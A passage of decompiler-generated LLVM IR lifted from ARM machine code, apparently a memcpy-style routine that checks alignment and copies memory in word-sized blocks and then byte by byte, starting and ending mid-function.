  store i1 %v7_168c0, i1* %cpsr_n.global-to-local, align 1
  %v8_168c0 = icmp eq i32 %v0_168c0, 4
  store i1 %v8_168c0, i1* %cpsr_z.global-to-local, align 1
  %v5_168c4 = icmp slt i32 %v0_168c0, 4
  br i1 %v5_168c4, label %bb140, label %dec_label_pc_168c8

dec_label_pc_168c8:                               ; preds = %bb
  %v1_168c8 = urem i32 %v1_168b0, 4
  store i32 %v1_168c8, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_168c8 = icmp eq i32 %v1_168c8, 0
  store i1 %v2_168c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_168c8, label %dec_label_pc_168d0, label %dec_label_pc_1697c

dec_label_pc_168d0:                               ; preds = %dec_label_pc_168c8
  %v1_168d0 = urem i32 %v0_168b0, 4
  store i32 %v1_168d0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_168d0 = icmp eq i32 %v1_168d0, 0
  store i1 %v2_168d0, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_168b0 to i2
  br i1 %v2_168d0, label %dec_label_pc_168d8, label %dec_label_pc_169ac

dec_label_pc_168d8:                               ; preds = %dec_label_pc_168d0, %dec_label_pc_169a4
  %v0_168f094 = phi i32 [ %v1_168b0, %dec_label_pc_168d0 ], [ %v0_16acc77, %dec_label_pc_169a4 ]
  %v0_168ec93 = phi i32 [ %v0_168b0, %dec_label_pc_168d0 ], [ %v0_169a4, %dec_label_pc_169a4 ]
  %v0_168d8 = phi i32 [ %v2_168c0, %dec_label_pc_168d0 ], [ %v2_1699c, %dec_label_pc_169a4 ]
  %v1_168d8 = add i32 %v0_168d8, -8
  store i32 %v1_168d8, i32* %r2.global-to-local, align 4
  %v3_168d8 = sub i32 7, %v0_168d8
  %v4_168d8 = and i32 %v3_168d8, %v0_168d8
  %v5_168d8 = icmp slt i32 %v4_168d8, 0
  store i1 %v5_168d8, i1* %cpsr_v.global-to-local, align 1
  %v6_168d8 = icmp slt i32 %v1_168d8, 0
  store i1 %v6_168d8, i1* %cpsr_n.global-to-local, align 1
  %v7_168d8 = icmp eq i32 %v0_168d8, 8
  store i1 %v7_168d8, i1* %cpsr_z.global-to-local, align 1
  %v2_168dc = xor i1 %v6_168d8, %v5_168d8
  br i1 %v2_168dc, label %dec_label_pc_1692c, label %dec_label_pc_168e0

dec_label_pc_168e0:                               ; preds = %dec_label_pc_168d8
  %v1_168e0 = add i32 %v0_168d8, -28
  store i32 %v1_168e0, i32* %r2.global-to-local, align 4
  %v3_168e0 = sub i32 27, %v0_168d8
  %v4_168e0 = and i32 %v3_168e0, %v1_168d8
  %v5_168e0 = icmp slt i32 %v4_168e0, 0
  store i1 %v5_168e0, i1* %cpsr_v.global-to-local, align 1
  %v6_168e0 = icmp slt i32 %v1_168e0, 0
  store i1 %v6_168e0, i1* %cpsr_n.global-to-local, align 1
  %v7_168e0 = icmp eq i32 %v1_168d8, 20
  store i1 %v7_168e0, i1* %cpsr_z.global-to-local, align 1
  %v2_168e4 = xor i1 %v6_168e0, %v5_168e0
  br i1 %v2_168e4, label %dec_label_pc_16918, label %dec_label_pc_168e8

dec_label_pc_168e8:                               ; preds = %dec_label_pc_168e0
  %v0_168e8 = load i32, i32* @r4, align 4
  store i32 %v0_168e8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_168ec

dec_label_pc_168ec:                               ; preds = %dec_label_pc_168ec.dec_label_pc_168ec_crit_edge, %dec_label_pc_168e8
  %v0_168f0 = phi i32 [ %v12_168f8, %dec_label_pc_168ec.dec_label_pc_168ec_crit_edge ], [ %v0_168f094, %dec_label_pc_168e8 ]
  %v0_168ec = phi i32 [ %v0_168ec.pre, %dec_label_pc_168ec.dec_label_pc_168ec_crit_edge ], [ %v0_168ec93, %dec_label_pc_168e8 ]
  %v1_168ec = inttoptr i32 %v0_168ec to i32*
  %v2_168ec = load i32, i32* %v1_168ec, align 4
  %v3_168ec = add i32 %v0_168ec, 4
  %v4_168ec = inttoptr i32 %v3_168ec to i32*
  %v5_168ec = load i32, i32* %v4_168ec, align 4
  store i32 %v5_168ec, i32* %r4.global-to-local, align 4
  %v6_168ec = add i32 %v0_168ec, 8
  %v7_168ec = inttoptr i32 %v6_168ec to i32*
  %v8_168ec = load i32, i32* %v7_168ec, align 4
  store i32 %v8_168ec, i32* %ip.global-to-local, align 4
  %v9_168ec = add i32 %v0_168ec, 12
  %v10_168ec = inttoptr i32 %v9_168ec to i32*
  %v11_168ec = load i32, i32* %v10_168ec, align 4
  store i32 %v11_168ec, i32* %lr.global-to-local, align 4
  %v12_168ec = add i32 %v0_168ec, 16
  store i32 %v12_168ec, i32* %r1.global-to-local, align 4
  %v1_168f0 = inttoptr i32 %v0_168f0 to i32*
  store i32 %v2_168ec, i32* %v1_168f0, align 4
  %v3_168f0 = add i32 %v0_168f0, 4
  %v4_168f0 = inttoptr i32 %v3_168f0 to i32*
  %v5_168f0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_168f0, i32* %v4_168f0, align 4
  %v6_168f0 = add i32 %v0_168f0, 8
  %v7_168f0 = inttoptr i32 %v6_168f0 to i32*
  %v8_168f0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_168f0, i32* %v7_168f0, align 4
  %v9_168f0 = add i32 %v0_168f0, 12
  %v10_168f0 = inttoptr i32 %v9_168f0 to i32*
  %v11_168f0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_168f0, i32* %v10_168f0, align 4
  %v12_168f0 = add i32 %v0_168f0, 16
  store i32 %v12_168f0, i32* %r0.global-to-local, align 4
  %v0_168f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_168f4 = inttoptr i32 %v0_168f4 to i32*
  %v2_168f4 = load i32, i32* %v1_168f4, align 4
  store i32 %v2_168f4, i32* @r3, align 4
  %v3_168f4 = add i32 %v0_168f4, 4
  %v4_168f4 = inttoptr i32 %v3_168f4 to i32*
  %v5_168f4 = load i32, i32* %v4_168f4, align 4
  store i32 %v5_168f4, i32* %r4.global-to-local, align 4
  %v6_168f4 = add i32 %v0_168f4, 8
  %v7_168f4 = inttoptr i32 %v6_168f4 to i32*
  %v8_168f4 = load i32, i32* %v7_168f4, align 4
  store i32 %v8_168f4, i32* @ip, align 4
  %v9_168f4 = add i32 %v0_168f4, 12
  %v10_168f4 = inttoptr i32 %v9_168f4 to i32*
  %v11_168f4 = load i32, i32* %v10_168f4, align 4
  store i32 %v11_168f4, i32* %lr.global-to-local, align 4
  %v12_168f4 = add i32 %v0_168f4, 16
  store i32 %v12_168f4, i32* @r1, align 4
  %v1_168f8 = inttoptr i32 %v12_168f0 to i32*
  store i32 %v2_168f4, i32* %v1_168f8, align 4
  %v3_168f8 = add i32 %v0_168f0, 20
  %v4_168f8 = inttoptr i32 %v3_168f8 to i32*
  %v5_168f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_168f8, i32* %v4_168f8, align 4
  %v6_168f8 = add i32 %v0_168f0, 24
  %v7_168f8 = inttoptr i32 %v6_168f8 to i32*
  %v8_168f8 = load i32, i32* @ip, align 4
  store i32 %v8_168f8, i32* %v7_168f8, align 4
  %v9_168f8 = add i32 %v0_168f0, 28
  %v10_168f8 = inttoptr i32 %v9_168f8 to i32*
  %v11_168f8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_168f8, i32* %v10_168f8, align 4
  %v12_168f8 = add i32 %v0_168f0, 32
  store i32 %v12_168f8, i32* @r0, align 4
  %v0_168fc = load i32, i32* %r2.global-to-local, align 4
  %v1_168fc = add i32 %v0_168fc, -32
  store i32 %v1_168fc, i32* %r2.global-to-local, align 4
  %v3_168fc = sub i32 31, %v0_168fc
  %v4_168fc = and i32 %v3_168fc, %v0_168fc
  %v5_168fc = icmp slt i32 %v4_168fc, 0
  %v6_168fc = icmp slt i32 %v1_168fc, 0
  %v2_16900 = xor i1 %v6_168fc, %v5_168fc
  br i1 %v2_16900, label %dec_label_pc_16904, label %dec_label_pc_168ec.dec_label_pc_168ec_crit_edge

dec_label_pc_168ec.dec_label_pc_168ec_crit_edge:  ; preds = %dec_label_pc_168ec
  %v0_168ec.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_168ec

dec_label_pc_16904:                               ; preds = %dec_label_pc_168ec
  %v1_16904 = add i32 %v0_168fc, -16
  %v3_16904 = add i32 %v0_168fc, 2147483616
  %v4_16904 = and i32 %v1_16904, %v3_16904
  %v5_16904 = icmp slt i32 %v4_16904, 0
  store i1 %v5_16904, i1* %cpsr_v.global-to-local, align 1
  %v6_16904 = icmp slt i32 %v1_16904, 0
  store i1 %v6_16904, i1* %cpsr_n.global-to-local, align 1
  %v7_16904 = icmp eq i32 %v1_16904, 0
  store i1 %v7_16904, i1* %cpsr_z.global-to-local, align 1
  %v2_16908 = xor i1 %v6_16904, %v5_16904
  br i1 %v2_16908, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_16904
  %v3_16908 = load i32, i32* @r1, align 4
  %v4_16908 = inttoptr i32 %v3_16908 to i32*
  %v5_16908 = load i32, i32* %v4_16908, align 4
  store i32 %v5_16908, i32* @r3, align 4
  %v6_16908 = add i32 %v3_16908, 4
  %v7_16908 = inttoptr i32 %v6_16908 to i32*
  %v8_16908 = load i32, i32* %v7_16908, align 4
  store i32 %v8_16908, i32* %r4.global-to-local, align 4
  %v9_16908 = add i32 %v3_16908, 8
  %v10_16908 = inttoptr i32 %v9_16908 to i32*
  %v11_16908 = load i32, i32* %v10_16908, align 4
  store i32 %v11_16908, i32* @ip, align 4
  %v12_16908 = add i32 %v3_16908, 12
  %v13_16908 = inttoptr i32 %v12_16908 to i32*
  %v14_16908 = load i32, i32* %v13_16908, align 4
  store i32 %v14_16908, i32* %lr.global-to-local, align 4
  %v15_16908 = add i32 %v3_16908, 16
  store i32 %v15_16908, i32* @r1, align 4
  %v4_1690c = inttoptr i32 %v12_168f8 to i32*
  store i32 %v5_16908, i32* %v4_1690c, align 4
  %v6_1690c = add i32 %v0_168f0, 36
  %v7_1690c = inttoptr i32 %v6_1690c to i32*
  %v8_1690c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_1690c, i32* %v7_1690c, align 4
  %v9_1690c = add i32 %v0_168f0, 40
  %v10_1690c = inttoptr i32 %v9_1690c to i32*
  %v11_1690c = load i32, i32* @ip, align 4
  store i32 %v11_1690c, i32* %v10_1690c, align 4
  %v12_1690c = add i32 %v0_168f0, 44
  %v13_1690c = inttoptr i32 %v12_1690c to i32*
  %v14_1690c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_1690c, i32* %v13_1690c, align 4
  %v15_1690c = add i32 %v0_168f0, 48
  store i32 %v15_1690c, i32* @r0, align 4
  %v3_16910 = load i32, i32* %r2.global-to-local, align 4
  %v4_16910 = add i32 %v3_16910, -16
  store i32 %v4_16910, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_16904, %bb136
  %v3_16920102111 = phi i32 [ %v15_1690c, %bb136 ], [ %v12_168f8, %dec_label_pc_16904 ]
  %v0_16918.pre = phi i32 [ %v4_16910, %bb136 ], [ %v1_168fc, %dec_label_pc_16904 ]
  %v2_16914 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16914, i32* @r4, align 4
  br label %dec_label_pc_16918

dec_label_pc_16918:                               ; preds = %dec_label_pc_168e0, %bb137
  %v3_16920101 = phi i32 [ %v0_168f094, %dec_label_pc_168e0 ], [ %v3_16920102111, %bb137 ]
  %v0_16918 = phi i32 [ %v1_168e0, %dec_label_pc_168e0 ], [ %v0_16918.pre, %bb137 ]
  %v1_16918 = add i32 %v0_16918, 20
  store i32 %v1_16918, i32* %r2.global-to-local, align 4
  %v3_16918 = sub i32 0, %v0_16918
  %v4_16918 = and i32 %v1_16918, %v3_16918
  %v5_16918 = icmp slt i32 %v4_16918, 0
  store i1 %v5_16918, i1* %cpsr_v.global-to-local, align 1
  %v6_16918 = icmp slt i32 %v1_16918, 0
  store i1 %v6_16918, i1* %cpsr_n.global-to-local, align 1
  %v7_16918 = icmp eq i32 %v1_16918, 0
  store i1 %v7_16918, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1691c

dec_label_pc_1691c:                               ; preds = %.thread115, %dec_label_pc_16918
  %v0_1692c.pre157 = phi i32 [ %v0_1692c.pre, %.thread115 ], [ %v1_16918, %dec_label_pc_16918 ]
  %v3_16920 = phi i32 [ %v3_1692099116, %.thread115 ], [ %v3_16920101, %dec_label_pc_16918 ]
  %v1_16924 = phi i1 [ %v1_16928, %.thread115 ], [ %v5_16918, %dec_label_pc_16918 ]
  %v0_16924 = phi i1 [ %v0_16928, %.thread115 ], [ %v6_16918, %dec_label_pc_16918 ]
  %v2_1691c = xor i1 %v1_16924, %v0_16924
  br i1 %v2_1691c, label %.thread115, label %bb138

bb138:                                            ; preds = %dec_label_pc_1691c
  %v3_1691c = load i32, i32* @r1, align 4
  %v4_1691c = inttoptr i32 %v3_1691c to i32*
  %v5_1691c = load i32, i32* %v4_1691c, align 4
  store i32 %v5_1691c, i32* @r3, align 4
  %v6_1691c = add i32 %v3_1691c, 4
  %v7_1691c = inttoptr i32 %v6_1691c to i32*
  %v8_1691c = load i32, i32* %v7_1691c, align 4
  store i32 %v8_1691c, i32* @ip, align 4
  %v9_1691c = add i32 %v3_1691c, 8
  %v10_1691c = inttoptr i32 %v9_1691c to i32*
  %v11_1691c = load i32, i32* %v10_1691c, align 4
  store i32 %v11_1691c, i32* %lr.global-to-local, align 4
  %v12_1691c = add i32 %v3_1691c, 12
  store i32 %v12_1691c, i32* @r1, align 4
  %v4_16920 = inttoptr i32 %v3_16920 to i32*
  store i32 %v5_1691c, i32* %v4_16920, align 4
  %v6_16920 = add i32 %v3_16920, 4
  %v7_16920 = inttoptr i32 %v6_16920 to i32*
  %v8_16920 = load i32, i32* @ip, align 4
  store i32 %v8_16920, i32* %v7_16920, align 4
  %v9_16920 = add i32 %v3_16920, 8
  %v10_16920 = inttoptr i32 %v9_16920 to i32*
  %v11_16920 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16920, i32* %v10_16920, align 4
  %v12_16920 = add i32 %v3_16920, 12
  store i32 %v12_16920, i32* @r0, align 4
  %v3_16924 = load i32, i32* %r2.global-to-local, align 4
  %v4_16924 = add i32 %v3_16924, -12
  store i32 %v4_16924, i32* %r2.global-to-local, align 4
  %v6_16924 = sub i32 11, %v3_16924
  %v7_16924 = and i32 %v6_16924, %v3_16924
  %v8_16924 = icmp slt i32 %v7_16924, 0
  store i1 %v8_16924, i1* %cpsr_v.global-to-local, align 1
  %v9_16924 = icmp slt i32 %v4_16924, 0
  store i1 %v9_16924, i1* %cpsr_n.global-to-local, align 1
  %v10_16924 = icmp eq i32 %v3_16924, 12
  store i1 %v10_16924, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_1691c, %bb138
  %v0_1692c.pre = phi i32 [ %v4_16924, %bb138 ], [ %v0_1692c.pre157, %dec_label_pc_1691c ]
  %v3_1692099116 = phi i32 [ %v12_16920, %bb138 ], [ %v3_16920, %dec_label_pc_1691c ]
  %v1_16928 = phi i1 [ %v8_16924, %bb138 ], [ %v1_16924, %dec_label_pc_1691c ]
  %v0_16928 = phi i1 [ %v9_16924, %bb138 ], [ %v0_16924, %dec_label_pc_1691c ]
  %v2_16928 = xor i1 %v1_16928, %v0_16928
  br i1 %v2_16928, label %dec_label_pc_1692c, label %dec_label_pc_1691c

dec_label_pc_1692c:                               ; preds = %.thread115, %dec_label_pc_168d8
  %v4_1693c = phi i32 [ %v0_168f094, %dec_label_pc_168d8 ], [ %v3_1692099116, %.thread115 ]
  %v0_1692c = phi i32 [ %v1_168d8, %dec_label_pc_168d8 ], [ %v0_1692c.pre, %.thread115 ]
  %v1_1692c = add i32 %v0_1692c, 8
  store i32 %v1_1692c, i32* %r2.global-to-local, align 4
  %v3_1692c = sub i32 0, %v0_1692c
  %v4_1692c = and i32 %v1_1692c, %v3_1692c
  %v5_1692c = icmp slt i32 %v4_1692c, 0
  store i1 %v5_1692c, i1* %cpsr_v.global-to-local, align 1
  %v6_1692c = icmp slt i32 %v1_1692c, 0
  store i1 %v6_1692c, i1* %cpsr_n.global-to-local, align 1
  %v7_1692c = icmp eq i32 %v1_1692c, 0
  store i1 %v7_1692c, i1* %cpsr_z.global-to-local, align 1
  %v2_16930 = xor i1 %v6_1692c, %v5_1692c
  br i1 %v2_16930, label %bb140, label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %dec_label_pc_1692c
  %v1_16934 = add i32 %v0_1692c, 4
  store i32 %v1_16934, i32* %r2.global-to-local, align 4
  %v3_16934 = sub i32 -5, %v0_1692c
  %v4_16934 = and i32 %v3_16934, %v1_1692c
  %v5_16934 = icmp slt i32 %v4_16934, 0
  store i1 %v5_16934, i1* %cpsr_v.global-to-local, align 1
  %v6_16934 = icmp slt i32 %v1_16934, 0
  store i1 %v6_16934, i1* %cpsr_n.global-to-local, align 1
  %v7_16934 = icmp eq i32 %v1_1692c, 4
  store i1 %v7_16934, i1* %cpsr_z.global-to-local, align 1
  %v2_16938 = xor i1 %v6_16934, %v5_16934
  %v3_16938 = load i32, i32* @r1, align 4
  %v4_16938 = inttoptr i32 %v3_16938 to i32*
  %v5_16938 = load i32, i32* %v4_16938, align 4
  store i32 %v5_16938, i32* @r3, align 4
  %v7_16938 = add i32 %v3_16938, 4
  br i1 %v2_16938, label %.thread122, label %bb139

.thread122:                                       ; preds = %dec_label_pc_16934
  store i32 %v7_16938, i32* @r1, align 4
  %v5_1693c = inttoptr i32 %v4_1693c to i32*
  store i32 %v5_16938, i32* %v5_1693c, align 4
  %v6_1693c = load i32, i32* @r0, align 4
  %v7_1693c = add i32 %v6_1693c, 4
  store i32 %v7_1693c, i32* @r0, align 4
  %v0_1694c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_16934
  %v7_16940 = inttoptr i32 %v7_16938 to i32*
  %v8_16940 = load i32, i32* %v7_16940, align 4
  store i32 %v8_16940, i32* @ip, align 4
  %v9_16940 = add i32 %v3_16938, 8
  store i32 %v9_16940, i32* @r1, align 4
  %v4_16944 = inttoptr i32 %v4_1693c to i32*
  store i32 %v5_16938, i32* %v4_16944, align 4
  %v6_16944 = add i32 %v4_1693c, 4
  %v7_16944 = inttoptr i32 %v6_16944 to i32*
  %v8_16944 = load i32, i32* @ip, align 4
  store i32 %v8_16944, i32* %v7_16944, align 4
  %v9_16944 = add i32 %v4_1693c, 8
  store i32 %v9_16944, i32* @r0, align 4
  %v3_16948 = load i32, i32* %r2.global-to-local, align 4
  %v4_16948 = add i32 %v3_16948, -4
  store i32 %v4_16948, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_1692c, %bb, %dec_label_pc_16afc, %dec_label_pc_16a90, %dec_label_pc_16a24, %bb139
  %v0_1694c = phi i32 [ %v0_1694c.pre, %.thread122 ], [ %v2_1699c, %.thread128 ], [ %v1_1692c, %dec_label_pc_1692c ], [ %v2_168c0, %bb ], [ %v0_1694c61, %dec_label_pc_16afc ], [ %v0_1694c60, %dec_label_pc_16a90 ], [ %v0_1694c59, %dec_label_pc_16a24 ], [ %v4_16948, %bb139 ]
  %v1_1694c = add i32 %v0_1694c, 4
  store i32 %v1_1694c, i32* %r2.global-to-local, align 4
  %v3_1694c = sub i32 0, %v0_1694c
  %v4_1694c = and i32 %v1_1694c, %v3_1694c
  %v5_1694c = icmp slt i32 %v4_1694c, 0
  store i1 %v5_1694c, i1* %cpsr_v.global-to-local, align 1
  %v6_1694c = icmp slt i32 %v1_1694c, 0
  store i1 %v6_1694c, i1* %cpsr_n.global-to-local, align 1
  %v7_1694c = icmp eq i32 %v1_1694c, 0
  store i1 %v7_1694c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1694c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_16954.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_16950 = load i8*, i8** %stack_var_-8, align 4
  %v4_16950 = ptrtoint i8* %v3_16950 to i32
  store i32 %v4_16950, i32* @r0, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_16954 = phi i32 [ %v0_16954.pre, %bb140.bb142_crit_edge ], [ %v8_168bc, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_1694c, i32 %v0_16954)
  %v0_16958 = load i32, i32* %r2.global-to-local, align 4
  %v1_16958 = add i32 %v0_16958, -2
  %v3_16958 = sub i32 1, %v0_16958
  %v4_16958 = and i32 %v3_16958, %v0_16958
  %v5_16958 = icmp slt i32 %v4_16958, 0
  store i1 %v5_16958, i1* %cpsr_v.global-to-local, align 1
  %v6_16958 = icmp slt i32 %v1_16958, 0
  store i1 %v6_16958, i1* %cpsr_n.global-to-local, align 1
  %v7_16958 = icmp eq i32 %v0_16958, 2
  store i1 %v7_16958, i1* %cpsr_z.global-to-local, align 1
  %v0_1695c = load i32, i32* @r1, align 4
  %v1_1695c = inttoptr i32 %v0_1695c to i8*
  %v2_1695c = load i8, i8* %v1_1695c, align 1
  %v5_1695c = add i32 %v0_1695c, 1
  store i32 %v5_1695c, i32* %r1.global-to-local, align 4
  %v2_16960 = load i32, i32* @r0, align 4
  %v3_16960 = inttoptr i32 %v2_16960 to i8*
  store i8 %v2_1695c, i8* %v3_16960, align 1
  %v4_16960 = load i32, i32* @r0, align 4
  %v5_16960 = add i32 %v4_16960, 1
  store i32 %v5_16960, i32* %r0.global-to-local, align 4
  %v0_16964 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16964 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16964 = xor i1 %v0_16964, %v1_16964
  br i1 %v2_16964, label %.thread125, label %bb143

bb143:                                            ; preds = %bb142
  %v3_16964 = load i32, i32* %r1.global-to-local, align 4
  %v4_16964 = inttoptr i32 %v3_16964 to i8*
  %v5_16964 = load i8, i8* %v4_16964, align 1
  %v8_16964 = add i32 %v3_16964, 1
  store i32 %v8_16964, i32* %r1.global-to-local, align 4
  %v6_16968 = inttoptr i32 %v5_16960 to i8*
  store i8 %v5_16964, i8* %v6_16968, align 1
  %v7_16968 = load i32, i32* %r0.global-to-local, align 4
  %v8_16968 = add i32 %v7_16968, 1
  store i32 %v8_16968, i32* %r0.global-to-local, align 4
  %v1_1696c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_1696c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb142, %bb143
  %v7_16970 = phi i32 [ %v8_16968, %bb143 ], [ %v5_16960, %bb142 ]
  %v2_16970 = phi i1 [ %v2_1696c.pre, %bb143 ], [ %v1_16964, %bb142 ]
  %v1_16970 = phi i1 [ %v1_1696c.pre, %bb143 ], [ %v0_16964, %bb142 ]
  %v0_1696c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_1696c = xor i1 %v2_16970, %v1_16970
  %v4_1696c = or i1 %v0_1696c, %v3_1696c
  br i1 %v4_1696c, label %.thread126, label %bb144

bb144:                                            ; preds = %.thread125
  %v5_1696c = load i32, i32* %r1.global-to-local, align 4
  %v6_1696c = inttoptr i32 %v5_1696c to i8*
  %v7_1696c = load i8, i8* %v6_1696c, align 1
  %v10_1696c = add i32 %v5_1696c, 1
  store i32 %v10_1696c, i32* %r1.global-to-local, align 4
  %v8_16970 = inttoptr i32 %v7_16970 to i8*
  store i8 %v7_1696c, i8* %v8_16970, align 1
  %v9_16970 = load i32, i32* %r0.global-to-local, align 4
  %v10_16970 = add i32 %v9_16970, 1
  store i32 %v10_16970, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb144
  %v2_16974 = load i8*, i8** %stack_var_-8, align 4
  %v3_16974 = ptrtoint i8* %v2_16974 to i32
  store i32 %v3_16974, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v8_168bc)
  %v0_1697c.pre = load i32, i32* @ip, align 4
  %v0_16984.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_16988.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1697c

dec_label_pc_1697c:                               ; preds = %dec_label_pc_168c8, %.thread126
  %v2_16988 = phi i32 [ %v1_168b0, %dec_label_pc_168c8 ], [ %v2_16988.pre, %.thread126 ]
  %v0_16984 = phi i32 [ %v0_168b0, %dec_label_pc_168c8 ], [ %v0_16984.pre, %.thread126 ]
  %v0_1697c = phi i32 [ %v1_168c8, %dec_label_pc_168c8 ], [ %v0_1697c.pre, %.thread126 ]
  %v1_1697c = sub i32 4, %v0_1697c
  store i32 %v1_1697c, i32* @ip, align 4
  %v1_16980 = add i32 %v1_1697c, -2
  %v3_16980 = sub i32 1, %v1_1697c
  %v4_16980 = and i32 %v3_16980, %v1_1697c
  %v5_16980 = icmp slt i32 %v4_16980, 0
  store i1 %v5_16980, i1* %cpsr_v.global-to-local, align 1
  %v6_16980 = icmp slt i32 %v1_16980, 0
  store i1 %v6_16980, i1* %cpsr_n.global-to-local, align 1
  %v7_16980 = icmp eq i32 %v1_1697c, 2
  store i1 %v7_16980, i1* %cpsr_z.global-to-local, align 1
  %v1_16984 = inttoptr i32 %v0_16984 to i8*
  %v2_16984 = load i8, i8* %v1_16984, align 1
  %v3_16984 = zext i8 %v2_16984 to i32
  store i32 %v3_16984, i32* @r3, align 4
  %v5_16984 = add i32 %v0_16984, 1
  store i32 %v5_16984, i32* @r1, align 4
  %v3_16988 = inttoptr i32 %v2_16988 to i8*
  store i8 %v2_16984, i8* %v3_16988, align 1
  %v4_16988 = load i32, i32* @r0, align 4
  %v5_16988 = add i32 %v4_16988, 1
  store i32 %v5_16988, i32* @r0, align 4
  %v0_1698c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_1698c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_1698c = xor i1 %v0_1698c, %v1_1698c
  br i1 %v2_1698c, label %.thread127, label %bb145

bb145:                                            ; preds = %dec_label_pc_1697c
  %v3_1698c = load i32, i32* @r1, align 4
  %v4_1698c = inttoptr i32 %v3_1698c to i8*
  %v5_1698c = load i8, i8* %v4_1698c, align 1
  %v6_1698c = zext i8 %v5_1698c to i32
  store i32 %v6_1698c, i32* @r3, align 4
  %v8_1698c = add i32 %v3_1698c, 1
  store i32 %v8_1698c, i32* @r1, align 4
  %v6_16990 = inttoptr i32 %v5_16988 to i8*
  store i8 %v5_1698c, i8* %v6_16990, align 1
  %v7_16990 = load i32, i32* @r0, align 4
  %v8_16990 = add i32 %v7_16990, 1
  store i32 %v8_16990, i32* @r0, align 4
  %v1_16994.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16994.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_1697c, %bb145
  %v7_16998 = phi i32 [ %v8_16990, %bb145 ], [ %v5_16988, %dec_label_pc_1697c ]
  %v2_16998 = phi i1 [ %v2_16994.pre, %bb145 ], [ %v1_1698c, %dec_label_pc_1697c ]
  %v1_16998 = phi i1 [ %v1_16994.pre, %bb145 ], [ %v0_1698c, %dec_label_pc_1697c ]
  %v0_16994 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16994 = xor i1 %v2_16998, %v1_16998
  %v4_16994 = or i1 %v0_16994, %v3_16994
  br i1 %v4_16994, label %.thread128, label %bb146

bb146:                                            ; preds = %.thread127
  %v5_16994 = load i32, i32* @r1, align 4
  %v6_16994 = inttoptr i32 %v5_16994 to i8*
  %v7_16994 = load i8, i8* %v6_16994, align 1
  %v8_16994 = zext i8 %v7_16994 to i32
  store i32 %v8_16994, i32* @r3, align 4
  %v10_16994 = add i32 %v5_16994, 1
  store i32 %v10_16994, i32* @r1, align 4
  %v8_16998 = inttoptr i32 %v7_16998 to i8*
  store i8 %v7_16994, i8* %v8_16998, align 1
  %v9_16998 = load i32, i32* @r0, align 4
  %v10_16998 = add i32 %v9_16998, 1
  store i32 %v10_16998, i32* @r0, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb146
  %v0_16acc77 = phi i32 [ %v10_16998, %bb146 ], [ %v7_16998, %.thread127 ]
  %v0_1699c = load i32, i32* %r2.global-to-local, align 4
  %v1_1699c = load i32, i32* @ip, align 4
  %v2_1699c = sub i32 %v0_1699c, %v1_1699c
  store i32 %v2_1699c, i32* %r2.global-to-local, align 4
  %v4_1699c = xor i32 %v1_1699c, %v0_1699c
  %v5_1699c = xor i32 %v2_1699c, %v0_1699c
  %v6_1699c = and i32 %v5_1699c, %v4_1699c
  %v7_1699c = icmp slt i32 %v6_1699c, 0
  store i1 %v7_1699c, i1* %cpsr_v.global-to-local, align 1
  %v8_1699c = icmp slt i32 %v2_1699c, 0
  store i1 %v8_1699c, i1* %cpsr_n.global-to-local, align 1
  %v9_1699c = icmp eq i32 %v0_1699c, %v1_1699c
  store i1 %v9_1699c, i1* %cpsr_z.global-to-local, align 1
  %v2_169a0 = xor i1 %v8_1699c, %v7_1699c
  br i1 %v2_169a0, label %bb140, label %dec_label_pc_169a4

dec_label_pc_169a4:                               ; preds = %.thread128
  %v0_169a4 = load i32, i32* @r1, align 4
  %v1_169a4 = urem i32 %v0_169a4, 4
  store i32 %v1_169a4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
